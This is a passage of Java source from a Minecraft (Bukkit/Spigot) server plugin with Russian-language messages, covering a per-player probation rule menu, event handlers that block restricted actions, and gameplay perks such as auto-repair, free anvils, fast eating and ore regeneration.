        if (sender instanceof Player) {
            Player p = (Player) sender;
            TextComponent chatLine = new TextComponent("§7Задержка чата: " + cdDisplay + " §8[ ");
            TextComponent set30s = new TextComponent("§b[30s]");
            set30s.setClickEvent(new ClickEvent(ClickEvent.Action.RUN_COMMAND, "/npl " + target.name + " chat 30s"));
            TextComponent set1m = new TextComponent("§b[1m]");
            set1m.setClickEvent(new ClickEvent(ClickEvent.Action.RUN_COMMAND, "/npl " + target.name + " chat 1m"));
            TextComponent set5m = new TextComponent("§b[5m]");
            set5m.setClickEvent(new ClickEvent(ClickEvent.Action.RUN_COMMAND, "/npl " + target.name + " chat 5m"));
            TextComponent clearCd = new TextComponent("§c[Снять]");
            clearCd.setClickEvent(new ClickEvent(ClickEvent.Action.RUN_COMMAND, "/npl " + target.name + " chat 0"));

            chatLine.addExtra(set30s);
            chatLine.addExtra(new TextComponent(" "));
            chatLine.addExtra(set1m);
            chatLine.addExtra(new TextComponent(" "));
            chatLine.addExtra(set5m);
            chatLine.addExtra(new TextComponent(" "));
            chatLine.addExtra(clearCd);
            chatLine.addExtra(new TextComponent(" §8]"));
            p.spigot().sendMessage(chatLine);
        } else {
            sender.sendMessage("§7Задержка чата: " + cdDisplay + " §8(/npl " + target.name + " chat <время>)");
        }

        sender.sendMessage(ChatColor.GRAY + "Нажмите на действие, чтобы запретить/разрешить для этого игрока:");

        boolean hasMatches = false;
        Map<String, Boolean> playerOverrides = playerNplRules.get(target.uuid);

        for (NplRuleInfo rule : NPL_RULE_DEFINITIONS) {
            if (filter != null && !filter.isEmpty()) {
                if (!rule.title.toLowerCase().contains(filter.toLowerCase()) &&
                        !rule.key.toLowerCase().contains(filter.toLowerCase()) &&
                        !rule.description.toLowerCase().contains(filter.toLowerCase())) {
                    continue;
                }
            }
            hasMatches = true;
            boolean isForbidden = isNplRuleForbidden(target.uuid, rule.key);
            boolean isCustom = (playerOverrides != null && playerOverrides.containsKey(rule.key));

            if (sender instanceof Player) {
                Player p = (Player) sender;
                TextComponent line = new TextComponent("§f• §7" + rule.title + ": ");

                TextComponent btn;
                if (isForbidden) {
                    btn = new TextComponent("§c§l[ЗАПРЕЩЕНО]");
                    btn.setHoverEvent(new HoverEvent(HoverEvent.Action.SHOW_TEXT,
                            new BaseComponent[]{ new TextComponent("§aКликните, чтобы РАЗРЕШИТЬ для " + target.name
                                    + "\n§7" + rule.description
                                    + (isCustom ? "\n§6★ Индивидуальная настройка" : "\n§8(По умолчанию сервера)")) }));
                } else {
                    btn = new TextComponent("§a§l[РАЗРЕШЕНО]");
                    btn.setHoverEvent(new HoverEvent(HoverEvent.Action.SHOW_TEXT,
                            new BaseComponent[]{ new TextComponent("§cКликните, чтобы ЗАПРЕТИТЬ для " + target.name
                                    + "\n§7" + rule.description
                                    + (isCustom ? "\n§6★ Индивидуальная настройка" : "\n§8(По умолчанию сервера)")) }));
                }
                btn.setClickEvent(new ClickEvent(ClickEvent.Action.RUN_COMMAND, "/npl " + target.name + " toggle " + rule.key));
                line.addExtra(btn);

                if (isCustom) {
                    TextComponent star = new TextComponent(" §6★");
                    star.setHoverEvent(new HoverEvent(HoverEvent.Action.SHOW_TEXT,
                            new BaseComponent[]{ new TextComponent("§6Индивидуально для " + target.name) }));
                    line.addExtra(star);
                }

                p.spigot().sendMessage(line);
            } else {
                String status = isForbidden ? "§c[ЗАПРЕЩЕНО]" : "§a[РАЗРЕШЕНО]";
                sender.sendMessage("§f• §7" + rule.title + ": " + status + (isCustom ? " §6★" : "") + " §8(/npl " + target.name + " toggle " + rule.key + ")");
            }
        }

        if (!hasMatches) {
            sender.sendMessage(ChatColor.YELLOW + "Действий по фильтру '" + filter + "' не найдено.");
        }

        if (sender instanceof Player) {
            Player p = (Player) sender;
            TextComponent footer = new TextComponent("§8[ ");
            TextComponent resetBtn = new TextComponent("§e[Сбросить к общим]");
            resetBtn.setHoverEvent(new HoverEvent(HoverEvent.Action.SHOW_TEXT,
                    new BaseComponent[]{ new TextComponent("§eСбросить правила игрока " + target.name + " к общим настройкам сервера") }));
            resetBtn.setClickEvent(new ClickEvent(ClickEvent.Action.RUN_COMMAND, "/npl " + target.name + " reset"));
            footer.addExtra(resetBtn);
            footer.addExtra(new TextComponent(" §8| "));
            TextComponent globalBtn = new TextComponent("§b[Общие настройки]");
            globalBtn.setHoverEvent(new HoverEvent(HoverEvent.Action.SHOW_TEXT,
                    new BaseComponent[]{ new TextComponent("§bОткрыть меню глобальных настроек по умолчанию") }));
            globalBtn.setClickEvent(new ClickEvent(ClickEvent.Action.RUN_COMMAND, "/npl settings"));
            footer.addExtra(globalBtn);
            footer.addExtra(new TextComponent(" §8]"));
            p.spigot().sendMessage(footer);
        } else {
            sender.sendMessage(ChatColor.DARK_GRAY + "Сброс: " + ChatColor.YELLOW + "/npl " + target.name + " reset" + ChatColor.DARK_GRAY + " | Общие: " + ChatColor.AQUA + "/npl settings");
        }
        sender.sendMessage(ChatColor.DARK_GRAY + "---------------------------------------------");
    }

    private void sendNplSettingsMenu(CommandSender sender, String filter) {
        sender.sendMessage(ChatColor.DARK_GRAY + "[" + ChatColor.RED + "" + ChatColor.BOLD + "NPL" + ChatColor.DARK_GRAY + "] " + ChatColor.RED + "" + ChatColor.BOLD + "Общие настройки ограничений (по умолчанию):");
        sender.sendMessage(ChatColor.GRAY + "Нажмите на статус, чтобы разрешить или запретить действие:");

        boolean hasMatches = false;
        for (NplRuleInfo rule : NPL_RULE_DEFINITIONS) {
            if (filter != null && !filter.isEmpty()) {
                if (!rule.title.toLowerCase().contains(filter.toLowerCase()) &&
                        !rule.key.toLowerCase().contains(filter.toLowerCase()) &&
                        !rule.description.toLowerCase().contains(filter.toLowerCase())) {
                    continue;
                }
            }
            hasMatches = true;
            boolean isForbidden = isNplRuleForbidden(rule.key);

            if (sender instanceof Player) {
                Player p = (Player) sender;
                TextComponent line = new TextComponent("§f• §7" + rule.title + ": ");

                TextComponent btn;
                if (isForbidden) {
                    btn = new TextComponent("§c§l[ЗАПРЕЩЕНО]");
                    btn.setHoverEvent(new HoverEvent(HoverEvent.Action.SHOW_TEXT,
                            new BaseComponent[]{ new TextComponent("§aКликните, чтобы РАЗРЕШИТЬ\n§7" + rule.description) }));
                } else {
                    btn = new TextComponent("§a§l[РАЗРЕШЕНО]");
                    btn.setHoverEvent(new HoverEvent(HoverEvent.Action.SHOW_TEXT,
                            new BaseComponent[]{ new TextComponent("§cКликните, чтобы ЗАПРЕТИТЬ\n§7" + rule.description) }));
                }
                btn.setClickEvent(new ClickEvent(ClickEvent.Action.RUN_COMMAND, "/npl toggle " + rule.key));

                line.addExtra(btn);
                p.spigot().sendMessage(line);
            } else {
                String status = isForbidden ? "§c[ЗАПРЕЩЕНО]" : "§a[РАЗРЕШЕНО]";
                sender.sendMessage("§f• §7" + rule.title + ": " + status + " §8(/npl toggle " + rule.key + ")");
            }
        }

        if (!hasMatches) {
            sender.sendMessage(ChatColor.YELLOW + "Действий по фильтру '" + filter + "' не найдено.");
        }

        sender.sendMessage(ChatColor.DARK_GRAY + "Поиск: " + ChatColor.YELLOW + "/npl settings <слово>" + ChatColor.DARK_GRAY + " | Меню игрока: " + ChatColor.YELLOW + "/npl <ник>");
    }

    private void sendNplHelp(CommandSender sender) {
        sender.sendMessage(ChatColor.DARK_GRAY + "[" + ChatColor.RED + "" + ChatColor.BOLD + "NPL" + ChatColor.DARK_GRAY + "] " + ChatColor.RED + "" + ChatColor.BOLD + "Команды управления:");
        sender.sendMessage(ChatColor.YELLOW + "/npl <ник>" + ChatColor.GRAY + " : Меню ограничений для конкретного игрока");
        sender.sendMessage(ChatColor.YELLOW + "/npl <ник> on/off" + ChatColor.GRAY + " : Включить/выключить ограничения");
        sender.sendMessage(ChatColor.YELLOW + "/npl <ник> chat <время>" + ChatColor.GRAY + " : Установить задержку чата (30s, 3m, 1h, 0)");
        sender.sendMessage(ChatColor.YELLOW + "/npl settings" + ChatColor.GRAY + " : Общие настройки по умолчанию");
        sender.sendMessage(ChatColor.YELLOW + "/npl list" + ChatColor.GRAY + " : Список игроков на испытательном сроке");
    }

    private void sendNplList(CommandSender sender) {
        sender.sendMessage(ChatColor.DARK_GRAY + "[" + ChatColor.RED + "" + ChatColor.BOLD + "NPL" + ChatColor.DARK_GRAY + "] "
                + ChatColor.WHITE + "Игроки на испытательном сроке (" + nplPlayers.size() + "):");
        if (nplPlayers.isEmpty()) {
            sender.sendMessage(ChatColor.GRAY + "Список пуст. Ни у кого нет активных ограничений.");
            return;
        }
        for (UUID u : nplPlayers) {
            Player p = Bukkit.getPlayer(u);
            String name = p != null ? p.getName() : playerNplNames.get(u);
            if (name == null) {
                try {
                    @SuppressWarnings("deprecation")
                    OfflinePlayer off = Bukkit.getOfflinePlayer(u);
                    name = (off != null && off.getName() != null) ? off.getName() : u.toString();
                } catch (Throwable ignored) {
                    name = u.toString();
                }
            }
            boolean isOnline = p != null && p.isOnline();
            boolean hasOverrides = playerNplRules.containsKey(u) && !playerNplRules.get(u).isEmpty();
            sender.sendMessage(ChatColor.GRAY + " • " + (isOnline ? ChatColor.GREEN : ChatColor.RED) + name
                    + ChatColor.DARK_GRAY + " (" + (isOnline ? "Онлайн" : "Оффлайн") + ")"
                    + (hasOverrides ? ChatColor.GOLD + " [★ Свои правила]" : ""));
        }
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onNplBlockBreak(BlockBreakEvent event) {
        try {
            Player player = event.getPlayer();
            Block block = event.getBlock();
            String key = locKey(block.getLocation());

            if (isNplTarget(player)) {
                UUID owner = blockOwners.get(key);
                if (owner != null) {
                    if (!owner.equals(player.getUniqueId())) {
                        if (isNplRuleForbidden(player, "break_foreign")) {
                            event.setCancelled(true);
                            sendNplWarning(player);
                            return;
                        }
                    }
                } else {
                    if (isNplRuleForbidden(player, "break_natural")) {
                        event.setCancelled(true);
                        sendNplWarning(player);
                        return;
                    }
                }
            }

            blockOwners.remove(key);
            if (block.getType().name().endsWith("_DOOR")) {
                blockOwners.remove(locKey(block.getLocation().clone().add(0, 1, 0)));
                blockOwners.remove(locKey(block.getLocation().clone().subtract(0, 1, 0)));
            }
            dynamicDecayBlocks.remove(key);
            hydroAnchorBlocks.remove(key);
        } catch (Throwable ignored) {}
    }

    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = true)
    public void onBlockPlace(BlockPlaceEvent event) {
        try {
            Player player = event.getPlayer();
            Block b = event.getBlockPlaced();

            blockOwners.put(locKey(b.getLocation()), player.getUniqueId());
            if (b.getType().name().endsWith("_DOOR")) {
                blockOwners.put(locKey(b.getLocation().clone().add(0, 1, 0)), player.getUniqueId());
            }

            if (isNplTarget(player)) {
                Material type = b.getType();
                if (type == Material.TNT || type.name().contains("TNT")) {
                    if (isNplRuleForbidden(player, "tnt_explosives")) {
                        event.setCancelled(true);
                        sendNplWarning(player);
                        return;
                    }
                }
                if (type == Material.RESPAWN_ANCHOR && player.getWorld().getEnvironment() == World.Environment.NORMAL) {
                    if (isNplRuleForbidden(player, "tnt_explosives")) {
                        event.setCancelled(true);
                        sendNplWarning(player);
                        return;
                    }
                }
                if (type == Material.FIRE) {
                    if (isNplRuleForbidden(player, "ignite")) {
                        event.setCancelled(true);
                        sendNplWarning(player);
                        return;
                    }
                }
            }

            if (softAnchorPlayers.contains(player.getUniqueId())) {
                Material type = b.getType();
                ItemStack hand = event.getItemInHand();
                Material handType = (hand != null) ? hand.getType() : null;
                boolean isGravityMat = (type == Material.SAND || type == Material.GRAVEL || type == Material.RED_SAND || type.name().endsWith("_CONCRETE_POWDER")
                        || (handType != null && (handType == Material.SAND || handType == Material.GRAVEL || handType == Material.RED_SAND || handType.name().endsWith("_CONCRETE_POWDER"))));
                if (isGravityMat) {
                    String key = locKey(b.getLocation());
                    dynamicDecayBlocks.put(key, player.getUniqueId());
                }
            }
        } catch (Throwable ignored) {}
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onNplPlayerInteract(PlayerInteractEvent event) {
        try {
            Player player = event.getPlayer();
            if (!isNplTarget(player)) return;

            if (event.getHand() == EquipmentSlot.OFF_HAND && event.getAction() == Action.RIGHT_CLICK_BLOCK) {
                Block cb = event.getClickedBlock();
                if (cb != null) {
                    String cbn = cb.getType().name();
                    if (cbn.endsWith("_DOOR") || cbn.endsWith("_TRAPDOOR") || cbn.endsWith("_FENCE_GATE") ||
                            cbn.endsWith("_BUTTON") || cbn.equals("LEVER") || cbn.endsWith("_PRESSURE_PLATE")) {
                        return;
                    }
                }
            }

            ItemStack item = event.getItem();
            if (item != null) {
                Material mat = item.getType();
                if (mat == Material.LAVA_BUCKET) {
                    if (isNplRuleForbidden(player, "place_lava")) {
                        event.setCancelled(true);
                        sendNplWarning(player);
                        return;
                    }
                }
                if (mat == Material.WATER_BUCKET) {
                    if (isNplRuleForbidden(player, "place_water")) {
                        event.setCancelled(true);
                        sendNplWarning(player);
                        return;
                    }
                }
                if (mat == Material.FLINT_AND_STEEL || mat == Material.FIRE_CHARGE) {
                    if (isNplRuleForbidden(player, "ignite")) {
                        event.setCancelled(true);
                        sendNplWarning(player);
                        return;
                    }
                }
                if (mat == Material.END_CRYSTAL) {
                    if (isNplRuleForbidden(player, "tnt_explosives")) {
                        event.setCancelled(true);
                        sendNplWarning(player);
                        return;
                    }
                }
                if (mat == Material.TNT_MINECART) {
                    if (isNplRuleForbidden(player, "tnt_explosives")) {
                        event.setCancelled(true);
                        sendNplWarning(player);
                        return;
                    }
                }
                if (mat == Material.ENDER_PEARL) {
                    if (isNplRuleForbidden(player, "ender_pearl")) {
                        event.setCancelled(true);
                        sendNplWarning(player);
                        return;
                    }
                }
            }

            if (event.getAction() == Action.RIGHT_CLICK_BLOCK) {
                Block block = event.getClickedBlock();
                if (block == null) return;
                Material mat = block.getType();

                if (isBlockOwnedByPlayer(block, player)) {
                    return;
                }

                if (mat == Material.CHEST || mat == Material.TRAPPED_CHEST || mat == Material.BARREL) {
                    if (isDungeonOrWorldChest(block)) {
                        if (isNplRuleForbidden(player, "dungeon_chests")) {
                            event.setCancelled(true);
                            sendNplWarning(player);
                            return;
                        }
                        return;
                    }

                    if (mat == Material.BARREL) {
                        if (isNplRuleForbidden(player, "foreign_barrels")) {
                            event.setCancelled(true);
                            sendNplWarning(player);
                            return;
                        }
                    } else {
                        if (isNplRuleForbidden(player, "foreign_chests")) {
                            event.setCancelled(true);
                            sendNplWarning(player);
                            return;
                        }
                    }
                }

                if (mat.name().contains("SHULKER_BOX")) {
                    if (isNplRuleForbidden(player, "foreign_shulkers")) {
                        event.setCancelled(true);
                        sendNplWarning(player);
                        return;
                    }
                }

                if (mat == Material.FURNACE || mat == Material.BLAST_FURNACE || mat == Material.SMOKER ||
                        mat == Material.BREWING_STAND || mat == Material.CRAFTER) {
                    if (isNplRuleForbidden(player, "foreign_furnaces")) {
                        event.setCancelled(true);
                        sendNplWarning(player);
                        return;
                    }
                }

                if (mat == Material.HOPPER || mat == Material.DISPENSER || mat == Material.DROPPER ||
                        mat == Material.DECORATED_POT || mat == Material.CHISELED_BOOKSHELF) {
                    if (isNplRuleForbidden(player, "foreign_hoppers")) {
                        event.setCancelled(true);
                        sendNplWarning(player);
                        return;
                    }
                }

                if (mat.name().endsWith("_DOOR") || mat.name().endsWith("_TRAPDOOR") || mat.name().endsWith("_FENCE_GATE")) {
                    if (isNplRuleForbidden(player, "doors_gates")) {
                        event.setCancelled(true);
                        sendNplWarning(player);
                        return;
                    }
                }

                if (mat.name().endsWith("_BUTTON") || mat == Material.LEVER || mat.name().endsWith("_PRESSURE_PLATE")) {
                    if (isNplRuleForbidden(player, "redstone")) {
                        event.setCancelled(true);
                        sendNplWarning(player);
                        return;
                    }
                }

                if (mat.name().endsWith("_BED")) {
                    if (isNplRuleForbidden(player, "beds")) {
                        event.setCancelled(true);
                        sendNplWarning(player);
                        return;
                    }
                }
            }
        } catch (Throwable ignored) {}
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onNplBucketEmpty(PlayerBucketEmptyEvent event) {
        try {
            Player player = event.getPlayer();
            if (!isNplTarget(player)) return;

            Material bucket = event.getBucket();
            if (bucket == Material.LAVA_BUCKET) {
                if (isNplRuleForbidden(player, "place_lava")) {
                    event.setCancelled(true);
                    sendNplWarning(player);
                }
            } else if (bucket == Material.WATER_BUCKET) {
                if (isNplRuleForbidden(player, "place_water")) {
                    event.setCancelled(true);
                    sendNplWarning(player);
                }
            }
        } catch (Throwable ignored) {}
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onNplEntityDamage(EntityDamageByEntityEvent event) {
        try {
            Player damager = null;
            if (event.getDamager() instanceof Player) {
                damager = (Player) event.getDamager();
            } else if (event.getDamager() instanceof Projectile) {
                Projectile proj = (Projectile) event.getDamager();
                if (proj.getShooter() instanceof Player) {
                    damager = (Player) proj.getShooter();
                }
            }

            if (damager == null || !isNplTarget(damager)) return;

            if (event.getEntity().getType() == EntityType.TNT_MINECART ||
                    event.getEntity().getType() == EntityType.TNT ||
                    event.getEntity().getType() == EntityType.END_CRYSTAL) {
                if (isNplRuleForbidden(damager, "tnt_explosives")) {
                    event.setCancelled(true);
                    sendNplWarning(damager);
                    return;
                }
            }

            if (event.getEntity() instanceof Player) {
                if (isNplRuleForbidden(damager, "pvp")) {
                    event.setCancelled(true);
                    sendNplWarning(damager);
                }
            } else if (event.getEntity() instanceof org.bukkit.entity.Animals ||
                    event.getEntity() instanceof org.bukkit.entity.Villager ||
                    event.getEntity() instanceof org.bukkit.entity.Tameable) {
                if (isNplRuleForbidden(damager, "attack_animals")) {
                    event.setCancelled(true);
                    sendNplWarning(damager);
                }
            }
        } catch (Throwable ignored) {}
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onNplInteractEntity(PlayerInteractEntityEvent event) {
        try {
            Player player = event.getPlayer();
            if (!isNplTarget(player)) return;

            org.bukkit.entity.Entity entity = event.getRightClicked();
            if (entity.getType() == EntityType.TNT_MINECART) {
                if (isNplRuleForbidden(player, "tnt_explosives")) {
                    event.setCancelled(true);
                    sendNplWarning(player);
                    return;
                }
            }
            if (entity instanceof org.bukkit.entity.ArmorStand || entity instanceof org.bukkit.entity.ItemFrame) {
                if (isNplRuleForbidden(player, "armor_stands")) {
                    event.setCancelled(true);
                    sendNplWarning(player);
                    return;
                }
            }
            if (entity instanceof org.bukkit.entity.Villager) {
                if (isNplRuleForbidden(player, "villager_trade")) {
                    event.setCancelled(true);
                    sendNplWarning(player);
                }
            }
        } catch (Throwable ignored) {}
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onNplVehicleDamage(VehicleDamageEvent event) {
        try {
            if (event.getVehicle().getType() != EntityType.TNT_MINECART) return;
            Player damager = null;
            if (event.getAttacker() instanceof Player) {
                damager = (Player) event.getAttacker();
            } else if (event.getAttacker() instanceof Projectile) {
                Projectile proj = (Projectile) event.getAttacker();
                if (proj.getShooter() instanceof Player) {
                    damager = (Player) proj.getShooter();
                }
            }
            if (damager == null || !isNplTarget(damager)) return;
            if (isNplRuleForbidden(damager, "tnt_explosives")) {
                event.setCancelled(true);
                sendNplWarning(damager);
            }
        } catch (Throwable ignored) {}
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onNplVehicleDestroy(VehicleDestroyEvent event) {
        try {
            if (event.getVehicle().getType() != EntityType.TNT_MINECART) return;
            Player damager = null;
            if (event.getAttacker() instanceof Player) {
                damager = (Player) event.getAttacker();
            } else if (event.getAttacker() instanceof Projectile) {
                Projectile proj = (Projectile) event.getAttacker();
                if (proj.getShooter() instanceof Player) {
                    damager = (Player) proj.getShooter();
                }
            }
            if (damager == null || !isNplTarget(damager)) return;
            if (isNplRuleForbidden(damager, "tnt_explosives")) {
                event.setCancelled(true);
                sendNplWarning(damager);
            }
        } catch (Throwable ignored) {}
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onNplEntityPickup(EntityPickupItemEvent event) {
        try {
            if (event.getEntity() instanceof Player) {
                Player player = (Player) event.getEntity();
                if (isNplTarget(player)) {
                    if (isNplRuleForbidden(player, "pickup_items")) {
                        event.setCancelled(true);
                    }
                }
            }
        } catch (Throwable ignored) {}
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onBlockPhysics(BlockPhysicsEvent event) {
        try {
            String key = locKey(event.getBlock().getLocation());
            if (dynamicDecayBlocks.containsKey(key)) {
                event.setCancelled(true);
            } else if (hydroAnchorBlocks.contains(key)) {
                event.setCancelled(true);
            }
        } catch (Throwable ignored) {}
    }

    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = true)
    public void onEntityChangeBlock(EntityChangeBlockEvent event) {
        try {
            String key = locKey(event.getBlock().getLocation());
            if (dynamicDecayBlocks.containsKey(key) || hydroAnchorBlocks.contains(key)) {
                event.setCancelled(true);
            }
        } catch (Throwable ignored) {}
    }

    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = true)
    public void onEntitySpawn(EntitySpawnEvent event) {
        try {
            if (event.getEntity() instanceof FallingBlock) {
                Location loc = event.getLocation().getBlock().getLocation();
                String key = locKey(loc);
                if (dynamicDecayBlocks.containsKey(key) || hydroAnchorBlocks.contains(key)) {
                    event.setCancelled(true);
                }
            }
        } catch (Throwable ignored) {}
    }

    @EventHandler(priority = EventPriority.MONITOR, ignoreCancelled = true)
    public void onBlockExplode(BlockExplodeEvent event) {
        try {
            for (Block b : event.blockList()) {
                String k = locKey(b.getLocation());
                dynamicDecayBlocks.remove(k);
                hydroAnchorBlocks.remove(k);
            }
        } catch (Throwable ignored) {}
    }

    @EventHandler(priority = EventPriority.MONITOR, ignoreCancelled = true)
    public void onEntityExplode(EntityExplodeEvent event) {
        try {
            for (Block b : event.blockList()) {
                String k = locKey(b.getLocation());
                dynamicDecayBlocks.remove(k);
                hydroAnchorBlocks.remove(k);
            }
        } catch (Throwable ignored) {}
    }

    @EventHandler(priority = EventPriority.MONITOR, ignoreCancelled = true)
    public void onPlayerStepTrap(PlayerMoveEvent event) {
        try {
            Location to = event.getTo();
            if (to == null) return;

            Block under = to.getBlock().getRelative(BlockFace.DOWN);
            String key = locKey(under.getLocation());
            if (!dynamicDecayBlocks.containsKey(key)) {
                under = to.clone().subtract(0, 0.3, 0).getBlock();
                key = locKey(under.getLocation());
            }

            if (dynamicDecayBlocks.containsKey(key)) {
                UUID ownerUuid = dynamicDecayBlocks.get(key);
                Player stepper = event.getPlayer();

                if (!stepper.getUniqueId().equals(ownerUuid)) {
                    dynamicDecayBlocks.remove(key);
                    under.getWorld().spawnFallingBlock(under.getLocation().add(0.5, 0, 0.5), under.getBlockData());
                    under.setType(Material.AIR, false);
                    under.getWorld().playSound(under.getLocation(), Sound.BLOCK_SAND_BREAK, 1.0f, 0.8f);
                }
            }
        } catch (Throwable ignored) {}
    }

    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = false)
    public void onPlayerItemDamage(PlayerItemDamageEvent event) {
        try {
            Player p = event.getPlayer();
            if (p != null && autoRepairPlayers.contains(p.getUniqueId())) {
                event.setCancelled(true);
                event.setDamage(0);
                repairIfDamaged(event.getItem());
            }
        } catch (Throwable ignored) {}
    }

    private void repairIfDamaged(ItemStack is) {
        if (is == null || is.getType() == Material.AIR) return;
        if (is.hasItemMeta() && is.getItemMeta() instanceof Damageable) {
            Damageable d = (Damageable) is.getItemMeta();
            if (d.getDamage() > 0) {
                d.setDamage(0);
                is.setItemMeta(d);
            }
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onPrepareAnvil(PrepareAnvilEvent event) {
        try {
            if (event.getView().getPlayer() instanceof Player) {
                Player p = (Player) event.getView().getPlayer();
                if (freeAnvilPlayers.contains(p.getUniqueId())) {
                    AnvilInventory inv = event.getInventory();
                    inv.setRepairCost(0);
                    inv.setMaximumRepairCost(99999);
                }
            }
        } catch (Throwable ignored) {}
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onAnvilClick(InventoryClickEvent event) {
        try {
            if (event.getWhoClicked() instanceof Player && event.getInventory() instanceof AnvilInventory) {
                Player p = (Player) event.getWhoClicked();
                if (freeAnvilPlayers.contains(p.getUniqueId())) {
                    AnvilInventory inv = (AnvilInventory) event.getInventory();
                    inv.setRepairCost(0);
                    inv.setMaximumRepairCost(99999);
                    if (event.getRawSlot() == 2) {
                        Location loc = inv.getLocation();
                        if (loc != null) {
                            Bukkit.getScheduler().runTaskLater(this, () -> {
                                try {
                                    if (loc.getBlock().getType().name().contains("ANVIL")) {
                                        loc.getBlock().setType(Material.ANVIL, false);
                                    }
                                } catch (Throwable ignored) {}
                            }, 1L);
                        }
                    }
                }
            }
        } catch (Throwable ignored) {}
    }

    @EventHandler(priority = EventPriority.MONITOR, ignoreCancelled = true)
    public void onPlayerBedEnter(PlayerBedEnterEvent event) {
        try {
            Player p = event.getPlayer();
            if (smartBedPlayers.contains(p.getUniqueId())) {
                if (event.getBedEnterResult() == PlayerBedEnterEvent.BedEnterResult.OK) {
                    Bukkit.getScheduler().runTaskLater(this, () -> {
                        try {
                            if (p.isOnline() && p.isSleeping()) {
                                World w = p.getWorld();
                                w.setTime(1000L);
                                w.setStorm(false);
                                w.setThundering(false);
                                p.wakeup(true);
                                p.playSound(p.getLocation(), Sound.ENTITY_PLAYER_LEVELUP, 0.5f, 1.8f);
                            }
                        } catch (Throwable ignored) {}
                    }, 40L);
                }
            }
        } catch (Throwable ignored) {}
    }

    @EventHandler(priority = EventPriority.MONITOR)
    public void onFastEatInteract(PlayerInteractEvent event) {
        try {
            if (event.getAction() != Action.RIGHT_CLICK_AIR && event.getAction() != Action.RIGHT_CLICK_BLOCK) return;
            Player player = event.getPlayer();
            if (!fastEatPlayers.contains(player.getUniqueId())) return;
            ItemStack item = event.getItem();
            if (item == null || !item.getType().isEdible()) return;
            if (player.getFoodLevel() < 20 || item.getType() == Material.GOLDEN_APPLE || item.getType() == Material.ENCHANTED_GOLDEN_APPLE || item.getType() == Material.CHORUS_FRUIT) {
                final Material foodType = item.getType();
                Bukkit.getScheduler().runTaskLater(this, () -> {
                    try {
                        if (player.isOnline()) {
                            ItemStack hand = player.getInventory().getItemInMainHand();
                            if (hand != null && hand.getType() == foodType) {
                                player.setFoodLevel(Math.min(20, player.getFoodLevel() + 6));
                                player.setSaturation(Math.min(20.0f, player.getSaturation() + 6.0f));
                                if (hand.getAmount() > 1) {
                                    hand.setAmount(hand.getAmount() - 1);
                                } else {
                                    player.getInventory().setItemInMainHand(null);
                                }
                                player.playSound(player.getLocation(), Sound.ENTITY_PLAYER_BURP, 0.6f, 1.1f);
                            }
                        }
                    } catch (Throwable ignored) {}
                }, 12L);
            }
        } catch (Throwable ignored) {}
    }

    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = true)
    public void onFreezeDamage(EntityDamageEvent event) {
        try {
            if (event.getEntity() instanceof Player) {
                Player p = (Player) event.getEntity();
                if (snowWalkPlayers.contains(p.getUniqueId())) {
                    if (event.getCause() == EntityDamageEvent.DamageCause.FREEZE) {
                        event.setCancelled(true);
                        p.setFreezeTicks(0);
                    }
                }
            }
        } catch (Throwable ignored) {}
    }

    @EventHandler(priority = EventPriority.MONITOR, ignoreCancelled = true)
    public void onOreBreak(BlockBreakEvent event) {
        try {
            Player player = event.getPlayer();
            if (!oreSyncPlayers.contains(player.getUniqueId())) return;

            Block block = event.getBlock();
            Material mat = block.getType();

            if (isValuableOre(mat)) {
                final Location loc = block.getLocation();
                final Material oreMat = mat;

                Bukkit.getScheduler().runTaskLater(this, () -> {
                    try {
                        if (loc.getBlock().getType() == Material.AIR) {
                            loc.getBlock().setType(oreMat, false);
                            loc.getWorld().spawnParticle(Particle.HAPPY_VILLAGER, loc.clone().add(0.5, 0.5, 0.5), 6, 0.3, 0.3, 0.3, 0.05);
                        }
                    } catch (Throwable ignored) {}
                }, 60L);
            }
        } catch (Throwable ignored) {}
    }

    private boolean isValuableOre(Material mat) {
        String name = mat.name();
        return name.contains("DIAMOND_ORE") || name.contains("ANCIENT_DEBRIS") || name.contains("GOLD_ORE")
                || name.contains("IRON_ORE") || name.contains("EMERALD_ORE") || name.contains("NETHER_GOLD_ORE")
                || name.contains("NETHER_QUARTZ_ORE") || name.contains("LAPIS_ORE") || name.contains("COPPER_ORE")
                || name.contains("REDSTONE_ORE");
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onBedInteract(PlayerInteractEvent event) {
        try {
            if (event.getAction() != Action.RIGHT_CLICK_BLOCK) return;
            Block clicked = event.getClickedBlock();
            if (clicked == null) return;
            if (!clicked.getType().name().endsWith("_BED")) return;

            Player player = event.getPlayer();
            if (!bedSessionPlayers.contains(player.getUniqueId())) return;

            World world = player.getWorld();
            if (world.getEnvironment() == World.Environment.NETHER || world.getEnvironment() == World.Environment.THE_END) {
                event.setCancelled(true);
                player.setRespawnLocation(clicked.getLocation().add(0.5, 0.6, 0.5), true);
                player.playSound(player.getLocation(), Sound.BLOCK_WOOL_STEP, 1.0f, 1.0f);
                player.getWorld().spawnParticle(Particle.HEART, clicked.getLocation().add(0.5, 0.8, 0.5), 4, 0.3, 0.3, 0.3, 0.1);

                AttributeInstance maxHealthAttr = player.getAttribute(Attribute.GENERIC_MAX_HEALTH);
                double maxHealth = maxHealthAttr != null ? maxHealthAttr.getValue() : 20.0;
                player.setHealth(maxHealth);
                player.setFoodLevel(20);
            }
        } catch (Throwable ignored) {}
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onBedEnter(PlayerBedEnterEvent event) {
        try {
            Player player = event.getPlayer();
            if (!bedSessionPlayers.contains(player.getUniqueId())) return;

            World world = player.getWorld();
            if (world.getEnvironment() == World.Environment.NETHER || world.getEnvironment() == World.Environment.THE_END) {
                event.setCancelled(true);
